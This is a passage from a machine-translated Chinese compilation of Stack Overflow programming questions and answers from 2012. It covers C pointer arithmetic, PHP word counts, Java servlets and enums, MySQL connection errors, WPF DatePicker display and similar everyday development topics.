 rotate_copy(arrayb,arrayb+30,arrayb+32,vrr); 
```

然后只是最终的返回值需要堆栈分配数组的副本：

```
 output.push_back(vector<int>(arrayb,arrayb+32));
  output.push_back(vector<int>(vx,vx+32)); 
```

# objective-c - 手动终止我的应用程序后 Xcode 模拟器崩溃？

> ID：11583295
> 
> 赞同：0
> 
> 时间：2012-07-20T16:21:26.767
> 
> 标签：objective-c, xcode, ios-simulator

当我双击主页按钮并终止我的应用程序时，模拟器会崩溃并显示黑屏，我必须从 Xcode 再次运行它。

我确定这不正常。例如 Safari 不这样做。

有谁知道这会导致什么？

我清除了方法，`viewWillDissappear`但`viewDidDissappear`仍然没有帮助。`viewWillUnload``viewDidUnload`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:28:40.833

发生这种情况是因为您从 Xcode 附加到应用程序的进程。当你在模拟器中终止它时，Xcode 吓坏了——我猜你得到了错误`SigKill`。这对于在模拟器中运行应用程序是正常的。

# c - int *p = (int*) 60 是什么意思？

> ID：11583297
> 
> 赞同：14
> 
> 时间：2012-07-20T16:21:32.390
> 
> 标签：c, pointers

```
#include <stdio.h>

int main()
{
    int *p = (int*) 60;    --- Line 1
    int *q = (int*) 40;    --- Line 2
    printf("%d", p-q);    //Output is 5
    return 0;
} 
```

有人可以向我解释一下这个程序的输出吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-20T16:23:08.783

这意味着将整数值分配给指针的（实现定义的）动作发生。这通常意味着`p`指向 的内存地址`60`和`q`的地址`40`。这些内存地址可以在虚拟内存、硬件内存中，并且许多实现对这些有不同的转换例程。

由于这是实现定义的，因此任何事情都可能发生，正如您的实现所描述的那样。

## 但这不是完全没有价值吗？

肯定不是，它在嵌入式硬件编程中被**大量**用于访问某些功能或调用内置函数。

* * *

您的系统上最有可能`int`是 4 个字节宽，因此`p - q`等于`(60 - 40) / 4 == 5`.

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-07-20T16:24:54.830

它`p`指向内存地址`60`并`q`指向内存地址`40`。那么大概你的架构有 4 字节`int`，所以`p - q`等于`5`((60 - 40) / 4)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T16:25:27.120

您正在创建两个指针值，然后进行指针数学运算。显然`sizeof(int)`在您的系统上是 4 个字节，所以两个指针值之间的距离是 5。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-20T16:26:13.157

每个指针`p`和`q`都是一个指向 int 的指针。`p`指向内存地址 60 和`q`内存地址 40。当从 中减去`q`时`p`，结果是中间有多少个 4 字节`int`，在本例中为 5。这样做是为了使使用带有数组的指针更容易，如果它们是在同一个数组中。

有关指针算法的更多信息，请参阅[此站点](http://www.cs.umd.edu/class/sum2003/cmsc311/Notes/BitOp/pointer.html)。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-20T16:28:20.567

该语句声明了一个指向地址 60 处的整数的指针

```
int *p = (int*) 60; 
```

您可能已经知道这一点；这样做的危险在于：你怎么知道地址 60 处实际存储了一个整数？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-20T16:35:56.473

int 指针初始化是为了确保指针指向整数的内存地址，在这种情况下，指针 p 和 q 分别为内存位置 60 和 40。

输出给您的是内存位置的差异。通常您期望 60-40 为 20，但在这种情况下，您得到 5，因为在您的机器中每个整数占用 4 个字节或 32 位。

所以你可以这样想：第一个整数在 40 处占 4 个位置，所以下一个整数在 44 处，然后是 48，然后是 52。因此，当获取内存位置的差异时，程序将每个 4 字节块作为 1块和 40 和 60 之间有 5 个块的差异。

在指针数学中，这可以像 abs(mem_location1 - mem_location2)/sizeof(int) 一样获得（即整数占用的字节数）。

HTH。:)

# php - PHP - 在字符串中找到超过特定字符长度的最常见单词。

> ID：11583298
> 
> 赞同：1
> 
> 时间：2012-07-20T16:21:39.213
> 
> 标签：php, count

好的，所以当我开始使用 PHP 时，我已经开始使用数组、字符串等。

现在我知道数组有一个名为“array_count_values”的简洁功能，它可以帮助确定最重复的条目是什么。我找不到与此等效的字符串 - 我需要将字符串转换为数组吗？

基本上，我希望我的代码确定给定字符串中超过一定长度的最常见（重复）单词。

没有字符长度限制，这段代码可以找到数组中重复次数最多的单词的答案：

```
<?php

$param[0]="Ted";
$param[1]="Mark";
$param[2]="Mark";
$param[3]="Ross"; 
$param[3]="Clarence"; 

function array_most_common($arr) 
{ 
  $counted = array_count_values($arr); 
  arsort($counted); 
  return(key($counted));     
}

$mostCommon = array_most_common($param);
echo $mostCommon;
?> 
```

那么用字符串做什么可以做到这一点呢？还有字符量过滤器？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:28:00.070

用一个字符串，你可以只[`explode()`](http://php.net/explode)或[`preg_split()`](http://php.net/preg_split)在空间上组成一个数组。使用`preg_split()`是有利的，因为它将消除不会的重复和无关空格`explode()`。

```
$array = preg_split( '/\s+/', "This is a pretty long long long string", -1, PREG_SPLIT_NO_EMPTY); 
```

然后，一旦你有一个数组，使用[`array_filter()`](http://php.net/array_filter)删除那些不符合字符要求的：

```
$threshold = 3;
$filtered = array_filter( $array, function( $el) use( $threshold) {
    return strlen( $el) > $threshold;
}); 
```

一旦你有了`$filtered`数组，只需在[`array_count_values()`](http://php.net/array_count_values).

```
$counts = array_count_values( $filtered);
arsort( $counts); 
echo key( $counts) . ' -> ' . current( $counts); 
```

[这](http://viper-7.com/S8TQC8)是一个演示，它打印：

```
long -> 3 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:27:41.577

要回答您的问题，据我所知，没有用于确定字符串中最常见单词的功能。但是，您可以`explode()`将字符串按空格，并将`array_count_values()`结果数组改为。我不太确定您所说的“字符量过滤器”是什么意思，或者您打算在哪里实现它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T16:28:53.840

```
$str = strtolower("The quick brown fox jumps over the lazy dog");
$words = explode(" ", $str);
$words = array_filter($words, function($word) {
    return strlen($word) > 2;
});
$word_counts = array_count_values($words);
arsort($word_counts);
$most_common_word = key($word_counts); // Returns "the" 
```

# php - 将 Access DB 从 PC 转移到 Web 版本

> ID：11583300
> 
> 赞同：0
> 
> 时间：2012-07-20T16:21:52.567
> 
> 标签：php, mysql, html, ms-access, ms-office

项目：将 Access DB 转变为基于 Web 的应用程序。

Access DB 描述：有两个关联的 .mdb。除了与后端 .mdb 交互的表单外，什么都没有。对于每个客户，都有一个 mdb 文件，其中包含他们公司的特定信息，我将其称为后端。客户加载访问权限，然后选择他们公司特定的后端，并通过前端表单生成报告、修改后端数据等与之交互。

进展：我已经创建了大多数使用 php 和 HTML 复制访问前端的表单。我正在复制后端访问数据库的 MySQL 数据库中构建表。

问题：是否有执行此过程的工具？需要一个数据库前端和后端，并自动化成为基于 Web 的过程？是否有可以受密码保护的 Cloud Access 版本？

我看过像 Zoho 和其他一些产品，他们似乎没有复制表格，只有表格对我没有好处。

任何帮助或输入表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-21T00:39:18.837

如 Access 2010 中所述，您现在有一个 Web 发布选项。您在 Access 中创建的表单将转换为 .net XMAL (zammel) 表单。事实上，这项工作相当不错，因为它们是完整的 AJAX 表单和子表单等，甚至可以动态加载以节省带宽。

您在访问 Web 表单中编写的任何代码都将成为 JavaScrip 并在浏览器中本地运行。（您必须使用新编辑器编写此代码 - VBA 不会在这些表单中运行）。

您可以将网站发布到 Office 365，这非常便宜（每月 6 美元起）。这是运行此类访问应用程序的示例，并注意在中途我如何切换到在浏览器中 100% 运行应用程序。

[http://www.youtube.com/watch?v=AU4mH0jPntI](http://www.youtube.com/watch?v=AU4mH0jPntI)

还要记住，这些生成的表单基于 Web 标准，客户端不需要 ActiveX 或 Silverlight（例如，这些表单可以在 iPad 上工作）。

而且因为您的后端不在 accDB 文件中，而是驻留在 office 365 中的表（列表）中，所以您使用了一个非常大且非常水平的可扩展服务器场（对用户数量没有真正的限制）。

除了将您的 Web 应用程序发布到 Office 365 之外，您还可以发布到 SharePoint 2010（但您需要现场企业版）。您也可以选择像 www.accesshosting.com 这样的人

尽管此设置为您提供了一种使用 Access 开发 Web 应用程序的出色 RAD 和快速方法，但请记住，现有表单或 VBA 代码没有转换实用程序。

但是，您可以将现有的 VBA 应用程序转换为基于 Web 的应用程序，并继续在每个用户的桌面上使用 VBA 应用程序以及云中的后端数据。然后，随着时间的推移，您可以将一些 Web 表单添加到 SAME 应用程序中，例如平板电脑等。这就是众所周知的混合应用程序。（Web 部件和旧版 VBA 部件都存在于同一应用程序中）。

因此，根据您的需要，在云中获取 Access 的一种好方法实际上是使用 Access。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:35:43.310

前端？否。后端？：[MySql Workbench](http://www.mysql.com/downloads/workbench/)具有专门设计用于从多个源（包括 Access）复制 shcema 的数据迁移工具。我已经使用了很多次并且对它很满意。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-02-22T12:44:29.500

我在模块内使用 VBA 宏将基本表单“导出”到 html。要使用它，请在数据库中添加一个模块并在第一个 for 循环中将表单名称替换为您的表单名称。它确实是基本脚本，但您可以增加它。实际上只导出文本控件。

```
Public Sub main()
  On Error Resume Next
  Dim ctl As Control
  Dim ppt As Property

  For Each ctl In Form_frmDadosGerais.Controls
    i_hType = ""
    i_name = ""
    i_cSource = ""
    'Debug.Print ctl.name & "  " & ctl.Properties.Count
    i_name = ctl.name
    For Each ppt In ctl.Properties
      If ppt.name = "Caption" Or ppt.name = "Visible" Then
        'REM Debug.Print "   " & ppt.Name & ":" & ppt.Value

      ElseIf ppt.name = "Width" Or ppt.name = "Height" Or ppt.name = "Top" Or ppt.name = "Left" Then
        'REM Debug.Print "   " & ppt.Name & ":" & getPixelsFrom(ppt.Value)

      ElseIf ppt.name = "ControlType" Then
        'REM Debug.Print "   " & ppt.Name & ":" & getCotrolType(ppt.Value)
        i_hType = getCotrolType(ppt.Value)

      ElseIf ppt.name = "ControlSource" Then
        i_cSource = ppt.Value

      ElseIf ppt.name = "Name" Or ppt.name = "ControlType" Or ppt.name = "ControlSource" Or ppt.name = "Format" Or ppt.name = "DecimalPlaces" Or ppt.name = "TextFormat" Then
        'REM Debug.Print "   " & ppt.Name & ":" & ppt.Value

      Else
        'REM Debug.Print ppt.Name

      End If

    Next ppt

    If i_hType = "text" Then
      Debug.Print getControlAsMaterialHtml(i_hType, i_name, i_cSource, "Tool Tip Text")
    End If
  Next ctl
End Sub

Public Function getCotrolType(ByRef ControlType As Variant) As String
    If ControlType = 109 Then
        getCotrolType = "text"
    ElseIf ControlType = 100 Then
        getCotrolType = "label"
    Else
        getCotrolType = "unknow (" & ControlType & ")"
    End If
End Function

Public Function getPixelsFrom(ByVal v As Variant) As String
  getPixelsFrom = Round(v / 2.54) & "px"
End Function

Public Function getControlAsMaterialHtml(hType As Variant, name As Variant, controlSource As Variant, ttip As Variant) As String
  h = "<div class=""form-group form-md-line-input"">" & Chr(10)
  h = h & "   <input type=""" & hType & """ class=""form-control"" name=""" & name & """ id=""" & name & """ [(ngModel)]=""model." & controlSource & """ placeholder=""Enter your email"">" & Chr(10)
  h = h & "   <label for=""" & name & """>" & name & "</label>" & Chr(10)
  h = h & "   <span class=""help-block"">" & ttip & "</span>" & Chr(10)
  h = h & "</div>" & Chr(10) & Chr(10)

  getControlAsMaterialHtml = h
End Function 
```

请记住，它需要改进，但您可以从这里开始。

对于表和数据，如果你使用的是linux，你可以使用mdb-tools，使用它你可以直接将表和数据导出到MySql服务器。

祝你好运！

# css - css 溢出可见 - 页面的隐藏部分

> ID：11583303
> 
> 赞同：1
> 
> 时间：2012-07-20T16:22:05.033
> 
> 标签：css, overflow

我正在努力解决常见问题 - 单击指向同一页面部分的锚链接后，整个块被移动到顶部几个像素，导致隐藏页面的其他部分。在[此特定页面上](http://www.biome.sk/aktivator-rastu-mihalnic-revita-eps)，单击评论链接（位于五星级右侧）并返回页面顶部后，页面标题（面包屑上方）会丢失。

我了解到这是由一个规则引起的`overflow: hidden`。我发现可以通过`overflow:visible`在`div#content-inner.content-inner.block`. 但无论我做什么，这条规则总是被`simple .block { overflow:hidden }`

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:28:39.830

`overflow:visible`将规则更改为`overflow:visible !important`。:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T19:50:55.613

我不确定您将哪个样式表放入您的 css 但我知道 .block 的样式

尝试

```
#content-region-inner .block {
    overflow: visible;
} 
```

如果这不起作用，请告诉我您使用哪个 css 将其放入

# java - 创建特定 servlet 的两个实例

> ID：11583310
> 
> 赞同：2
> 
> 时间：2012-07-20T16:22:15.033
> 
> 标签：java, jakarta-ee, tomcat, servlets

我有疑问，如果我提到我的 servlet 应用程序的 web.xml，如下所示..

```
<servlet>
<servlet-name>AuthenticationServlet</servlet-name>
<display-name>AuthenticationServlet</display-name>
<servlet-class>com.trading.AuthenticationServlet</servlet-class>
<load-on-startup>2</load-on-startup>
</servlet>

<servlet>
<servlet-name>AuthorizationServlet</servlet-name>
<display-name>AuthorizationServlet</display-name>
<servlet-class>com.trading.AuthorizationServlet</servlet-class>
<load-on-startup>4</load-on-startup>
</servlet> 
```

现在我想要 AuthenticationServlet servlet 容器应该创建它的两个实例，我将如何做到这一点，请指教

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-20T16:28:56.213

您可以使用指向同一个 servlet 类的不同`<servlet>`条目来定义多个 servlet 实例。`web.xml`

```
<servlet>
    <servlet-name>AuthorizationServlet1</servlet-name>
    <servlet-class>com.trading.AuthorizationServlet</servlet-class>
</servlet>
<servlet>
    <servlet-name>AuthorizationServlet2</servlet-name>
    <servlet-class>com.trading.AuthorizationServlet</servlet-class>
</servlet> 
```

您只需要将它们映射到不同的 URL 模式。

也就是说，我有一个强烈的印象，即您在寻找针对特定功能需求的解决方案时，您在寻找完全错误的方向，而您在问题中没有说明任何内容。在一个设计合理的 servlet Web 应用程序中，通常不需要有多个 servlet 实例。例如，如果您需要存储特定于用户的信息，请为此使用 HTTP 会话。要了解 servlet 如何工作以及如何使用它们，请阅读[servlet 如何工作？实例化、会话、共享变量和多线程](https://stackoverflow.com/questions/3106452/how-do-servlets-work-instantiation-session-variables-and-multithreading/3106909#3106909)

# cocoa-touch - How to automatically switch to another scene after an online video finishes playing, in an iPhone App?

> ID：11583321
> 
> 赞同：0
> 
> 时间：2012-07-20T16:22:45.293
> 
> 标签：cocoa-touch, uikit, mpmovieplayercontroller, uistoryboard

Here's the user story for this simple iPhone App:

The user clicks on the thumbnail and triggers the `MPMoviePlayerViewController` to play the online video (in full screen).

We know that after the video finishes it would automatically shut down the player, then return to the previous page.

I need: return to another scene, not the previous one with the thumbnail.

Is there anybody who could offer some help? Thank you very much ahead of time.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:31:10.333

侦听 MPMoviePlayerPlaybackDidFinishNotification 通知，然后将新的视图控制器推送到堆栈中。

有关该通知和电影播放器​​视图控制器的更多信息，请访问此处：http: [//developer.apple.com/library/ios/documentation/mediaplayer/reference/MPMoviePlayerController_Class/Reference/Reference.html](http://developer.apple.com/library/ios/documentation/mediaplayer/reference/MPMoviePlayerController_Class/Reference/Reference.html)

*编辑 - 添加如何收听通知......*

以下是收听通知的方法：

```
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(playerPlaybackDidFinish:) name:MPMoviePlayerPlaybackDidFinishNotification object:self.player]; 
```

其中 self.player 是电影播放器​​实例，而 playerPlaybackDidFinish 是您定义的用于处理回调的方法 :)

# licensing - 数据挖掘库和许可限制

> ID：11583333
> 
> 赞同：1
> 
> 时间：2012-07-20T16:23:48.403
> 
> 标签：licensing, data-mining, weka

我想为我的客户实现数据挖掘服务。我没有时间从头开始做所有的数据挖掘方法。我更喜欢为此使用*Weka*。

但我不知道：那里会有什么许可限制？如果我不能从服务器端商务应用程序中使用 Weka，那么我可以使用什么类似的*Weka*类库？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-21T09:21:49.197

最好的方法是**联系他们**。他们通过 Pentaho 提供专业支持，您可能可以从他们那里获得不同的许可证。这并不一定意味着它会很昂贵。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-21T00:50:13.960

我自己解决了这个问题。我发现这篇文章[http://cboblog.typepad.com/cboblog/2008/06/open-source-gpl.html](http://cboblog.typepad.com/cboblog/2008/06/open-source-gpl.html)关于在 SaaS 上使用 GPL。现在我明白了，如果库仅在服务器端工作，我可以使用它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T12:41:46.190

> 但我不知道：那里会有什么许可限制？

在旁观者的眼中，什么是限制，什么不是。使用条款在许可文本中进行了概述，因此您应该首先阅读。这应该可以回答您的大部分问题。

许可证文本应该随软件一起提供，您也可以在[GPL 常见问题解答页面](http://www.gnu.org/licenses/gpl-faq.html)上找到常见问题解答：

*   [GPL 是否要求将修改版本的源代码发布给公众？](http://www.gnu.org/licenses/gpl-faq.html#GPLRequireSourcePostedPublic)
*   [一家公司正在网站上运行 GPL 程序的修改版本。GPL 是否规定他们必须发布修改后的源代码？](http://www.gnu.org/licenses/gpl-faq.html#UnreleasedMods)

> 如果我不能从服务器端商务应用程序中使用 Weka，那么我可以使用什么类似的 Weka 类库？

Weka 是免费软件。您至少可以自由使用它，所以我认为您实际上不需要寻找替代方案。

# iphone - 可以使用 HTML5 和 JavaScript 创建一个原生 iPhone 应用程序吗？

> ID：11583334
> 
> 赞同：0
> 
> 时间：2012-07-20T16:23:54.110
> 
> 标签：iphone

可以使用 HTML5 和 JavaScript 创建一个原生 iPhone 应用程序吗？这是怎么做到的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:33:11.543

您可以使用**Phone gap**来开发 iphone 应用程序。这是一个免费的 sdk，您可以使用这个 sdk 为 I-phone、android、windows mobile、black berry 等开发应用程序。**Titanium** sdk 是另一种。phone gap 使用 html、css、javascript 和 jquery 进行应用程序开发。

但是您需要在 XCode 上创建一个 IPA 以将其安装在 Apple 设备（Iphone、Ipad 等）上。请检查这些 sdk 链接：[Phone gap](http://phonegap.com/) , [Titanium](http://www.appcelerator.com/)

# api - Wordnik API 中的“术语的最低语料库频率”是什么？

> ID：11583339
> 
> 赞同：2
> 
> 时间：2012-07-20T16:24:18.447
> 
> 标签：api, dictionary, wordnik

使用 Wordnik API 请求单词时，您可以指定最小和最大语料库频率。

[http://developer.wordnik.com/docs#!/words/search_words](http://developer.wordnik.com/docs#!/words/search_words)

在这种情况下，语料库频率到底是多少？它是如何测量的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T05:26:21.003

语料库频率是一个（区分大小写的）单词被找到的次数的度量，它基于 Wordnik 消耗的数百万个文档。您可以使用此度量来确定单词的“共性”。

# java - Java JComboBox 自动完成

> ID：11583344
> 
> 赞同：3
> 
> 时间：2012-07-20T16:24:23.887
> 
> 标签：java, swing, drop-down-menu, autocomplete, jcombobox

我有一个 ArrayList of People - 它由姓名、电子邮件和一些数字组成（但它们都是字符串）。我使用这个列表在我的表单上填充一个 JComboBox。

我想要实现的是一个自动完成的 JComboBox，例如，在输入 Tim 时：

按“T”->它将下拉显示以“T”开头的所有内容

按“i”->它将下拉显示以“Ti”开头的所有内容

按“m”->它将下拉显示开头有“Tim”的所有内容。

我尝试了几种方法 - 查看了 SwingX 之类的东西，但似乎服务器已关闭，我无法访问任何文档。我尝试过创建自己的算法，但它变得相当复杂，而且我一直在走一些死胡同。我想知道是否有人知道实现我正在尝试的任何好方法？

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:35:47.020

> 我想知道是否有人知道实现我正在尝试的任何好方法？

使用任何提供自动完成功能的现有库。SwingX 在 API 中确实有这样的功能，但其他的也可用。

查看[这篇文章](http://today.java.net/pub/a/today/2007/07/19/adding-auto-completion-to-swing-comboboxes.html)，其中包含有关 Java 自动完成的更多信息，并包含一些提供此功能的第 3 方库的链接

# java - pushSDK send push to MDS

> ID：11583345
> 
> 赞同：1
> 
> 时间：2012-07-20T16:24:31.053
> 
> 标签：java, blackberry, push-notification, push

i tried to send a push to browser " a browser message " to my device connected to mds via bes.

when i send my request (and request headers ...) the response is a http 202 and the pap response is 1001 which is accepted.

when i check the device, nothing happen, the push is not delivered. help me

here is my class:

```
public class PushSender {

    IdGenerator idGenerator= new IdGeneratorImpl();
    String destination ="7874";//for bes => port ,  for bis :app id
    List<String> addresses = new ArrayList<String>();
    //String mds="http://win-uhgr7vs88uz.assabb.com:8080/";

    public void initPushSender() {

        addresses.add("bestest@assa-associates.com");

        PushMessageControl pushMessageControl=new PushMessageControl(false,idGenerator,"Marhaba push",addresses);
        Content papContent =new TextContent("message a envoyer");

        ContentType contentType=new ContentType("TEXT_PLAIN"); //TEXT_PLAIN//TEXT_HTML
        papContent.setContentType(contentType);
        papContent.setHeader("X-Wap-Application-Id", "/");
        papContent.setHeader("X-Rim-Push-Type", "browser-message");
        papContent.setHeader("X-Rim-Push-Title", "push title");
        papContent.setHeader("X-Rim-Push-Dest-Port", "7874");

        PushSDKPropertiesImpl properties=new PushSDKPropertiesImpl();

        HttpClient client= new HttpClientImpl();

        ((HttpClientImpl) client).setPushSDKProperties(properties);

        PapService papService=new PapServiceImpl();
        papService.setHttpClient(client);

        papService.setPushSDKProperties(properties);

        try {
            PushResponse response =papService.push(null,null,destination,pushMessageControl, papContent);

            System.out.println("code Response: "+response.getCode());
            System.out.println(response);
        } catch (PushSDKException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (BadMessageException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (UnauthorizedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    }
    public static void main(String []args){
        PushSender pu=new PushSender();
        pu.initPushSender();

    }

} 
```

even when i try to send rim push , response is 1001 but push not delivered.

when i use a sample c# app, the push is delivered

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T19:53:59.107

请确认您是否能够使用安装目录中的 JDE 示例通过 BES/MDS 成功进行 PAP 推送

服务端应用程序：C:\Eclipse\plugins\net.rim.ejde.componentpack7.0.0_7.0.0.33\components\samples\com\rim\samples\server\httppushdemo

客户端应用程序：C:\Eclipse\plugins\net.rim.ejde.componentpack7.0.0_7.0.0.33\components\samples\com\rim\samples\device\httppushdemo

如果您使用可靠推送，请确保将此端口添加到您的 BES 配置中。 [http://docs.blackberry.com/en/admin/deliverables/14334/Specify_device_ports_for_reliable_push_requests_490067_11.jsp](http://docs.blackberry.com/en/admin/deliverables/14334/Specify_device_ports_for_reliable_push_requests_490067_11.jsp)

谢谢，

古尔泰伊

# php - PHP：MySQL 服务器已经消失

> ID：11583352
> 
> 赞同：9
> 
> 时间：2012-07-20T16:24:40.907
> 
> 标签：php, mysql

我知道这个问题已经被问过很多次，但我已经尝试了一切。

我有一个 PHP 脚本，它遍历数千张图像，在必要时执行调整大小，然后插入到数据库中。

我收到此错误消息：

> 警告：mysql_query() [function.mysql-query]: MySQL 服务器已在第 105 行的 C:\Utilities\server\htdocs\newGen\index.php 中消失
> 
> 警告：mysql_query() [function.mysql-query]：在第 105 行的 C:\Utilities\server\htdocs\newGen\index.php 中读取结果集的标头时出错

我正在使用 Xampplite，因此 php.ini 的某些部分丢失了其他人用来解决问题的部分，因为他们没有使用 lite 版本。

我确定问题不在于超时。虽然脚本将运行几分钟，但它会跳过已经处理过的图像，因此我很快会在大约 10 秒内收到错误消息。也许这与最大表大小有关？我在我的 php.ini 中找不到任何控制它的东西。

非常感谢所有帮助，我已经做了几个小时了。

编辑：

这是 105 标记处的代码，它是查询：

```
 // Add tNail and image to db
        mysql_query("INSERT INTO gallery values('','$hash','$thumbBlob','$imageBlob','$type','','0','0.0')");
    //  $q->execute();
        print "Successfully processed $fileName<br>"; 
```

正如您在评论中看到的那样，我尝试使用 PDO 并得到同样的错误，我愚蠢地认为回到 mysql_ 命令会有所帮助。

如果它有任何帮助，脚本每次都会抱怨同一个图像，但每个图像只有几十千字节，最多几百。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-07-20T16:32:28.787

检查MySQL 配置文件中“ `max_allowed_packet`”的值。`my.cnf`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:28:04.280

发生这种情况是因为 PHP 脚本处理它所处理的任何内容的时间过长，并且与服务器的连接超时。你有几个解决方案：

*   检查以确保连接仍然正常，并在需要时重新连接（`mysql_connect`具有内置功能可以为您执行此操作）
*   使用`mysql_pconnect`（但请记住在最后关闭连接，因为它不会为您关闭）
*   提高脚本的运行时间以避免超时。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T16:37:24.123

您可以使用`mysql_ping()`来查看连接是否仍然连接，如果没有，您可以尝试重新连接，或者发出错误消息，告诉您在连接丢失之前脚本已经走了多远。

# java - 在被线程更新时读取布尔数组

> ID：11583354
> 
> 赞同：0
> 
> 时间：2012-07-20T16:24:44.623
> 
> 标签：java, multithreading, thread-safety

目前这似乎有效，但也许有一天它会出错：

我有一个二维布尔数组，这些布尔值代表各种对象的状态（如果它们准备好或不被处理）

一个线程正在运行并制作这些对象，一旦制作了一个对象，它的布尔值就会设置为“true”（制作一个对象最多需要 20 毫秒）。

我的问题是：

我可以在线程发挥它的魔力时读取（仅读取）这个数组吗？如果线程在我的方法读取它时写入 true，会发生什么？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:30:50.827

写入`boolean`是原子的，因此您不会看到任何不一致之处。`long`和的情况并非如此`double`。

发生在你身上的最糟糕的事情就是*能见度*。当一个线程更新给定变量但其他线程没有立即（或从不）看到该更改时，会出现可见性问题。

为了确保所有线程看到相同的最新值，您必须使用某种同步或`volatile`字段。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:28:52.110

> 我可以在线程发挥它的魔力时读取（仅读取）这个数组吗？如果线程在我的方法读取它时写入 true，会发生什么？

是的，您可以很好地阅读它，如果您尝试对其进行写入，您可能会发现自己陷入困境。至于第二个问题，很简单，这是不可能的。您不能在该索引发生变化的同时读取该索引。它要么等到写入完成，要么读取写入之前的任何内容。

# .net - 日期时间选择器不显示当前年份（WPF）？

> ID：11583359
> 
> 赞同：0
> 
> 时间：2012-07-20T16:25:04.033
> 
> 标签：.net, wpf, vb.net, wpf-controls

我正在创建一个具有 datepicker 控件的 xabp 应用程序。我想默认显示当前日期，并编写了以下按预期工作的代码：

```
 <DatePicker Height="25" SelectedDate="{x:Static System:DateTime.Now}" HorizontalAlignment="Left" DisplayDate="" Margin="181,141,0,0" Name="DatePicker1" VerticalAlignment="Top" Width="115" IsTodayHighlighted="False" 
```

虽然它显示当前日期，但是当我想选择另一个日期时，它会像这样显示年份。请按照图片。

![在此处输入图像描述](../Images/7d8687483ece04173e395dbb056f0eca.png)

我该如何解决这个问题？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:38:44.130

如果您删除`DisplayDate=""`或给它一个真实的日期（例如`DisplayDate="3/15/2009"`）它会起作用。

# eclipse - 在 Eclipse 中进行子类化的最佳方式？

> ID：11583360
> 
> 赞同：1
> 
> 时间：2012-07-20T16:25:07.713
> 
> 标签：eclipse

我想真正快速地生成一个子类，想知道哪个是最快/最好的方法？似乎没有选项可以例如右键单击和“生成子类..”，但这可能是一个合理的代码开发选项，因为这样可以节省我手动编写扩展内容的时间。

您对此功能有任何意见或事实吗，它应该存在吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:06:11.963

我认为 Refactor -> Extract Superclass... 非常接近。使您现有的类成为子类并创建超类。然后根据需要重命名。不知道为什么没有提取子类......，但我想他们已经考虑过这一点，并且由于某种原因没有发现它是必要的。

# java - 枚举构造函数静态初始化器

> ID：11583361
> 
> 赞同：5
> 
> 时间：2012-07-20T16:25:08.007
> 
> 标签：java

我发现它与枚举很相似。这是 Kathy Siera 书中的一个例子：

```
 public class WeatherTest {

    static Weather w;

    public static void main(String[] args) {
        System.out.print(w.RAINY.count + " " + w.Sunny.count + " ");
    }
}

enum Weather {

    RAINY, Sunny;
    int count = 0;

    Weather() {
        System.out.print("c ");
        count++;
    }
} 
```

输出为 cc 1 1。明白了。现在我想如果计数字段是静态的怎么办？输出会是 cc 2 2 吗？在此基础上，我将count变量修改为static。但后来我看到的是：编译时错误：从初始化程序非法引用静态字段。

在网上搜索我发现这是 Sun 的某种漏洞，它允许使用可以更改静态字段的静态方法。好的..所以现在我使用静态方法 incr 来完成我的工作：

```
 class WeatherTest {

    static Weather w;

    public static void main(String[] args) {
        System.out.print(w.RAINY.count + " " + w.Sunny.count + " ");
    }
}

enum Weather {

    RAINY, Sunny;

    Weather() {
        System.out.print("c ");
        incr();
    }
    static int count = 0;

    static void incr() {
        count++;
    }
} 
```

令我惊讶的是，我得到了输出：cc 0 0！在我开枪之前，谁能向我解释一下这种行为？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-20T16:37:17.930

枚举值可以被认为是美化的静态字段（它们在幕后）。

所以，如果你`Weather`是一个普通的 Java 类，它会是这样的：

```
 class Weather {
   public final static Weather RAINY = new Weather( );
   public final static Weather Sunny = new Weather( );

   static int count = 0;

   Weather( ) {
     System.out.print("c ");
     incr();
   }

   static void incr()
   {
      count++;
   }
 } 
```

您可以看到它是在两个枚举值**之后**`count`声明的，这意味着它也在创建两个值之后被*初始化*。此外，遇到未初始化的静态变量的每个函数调用都将其视为使用默认值初始化（ for it's ）。***`int``0`***

 ***`incr`因为您在正确初始化后从不调用`count`，所以您看到它的值仍然`0`***

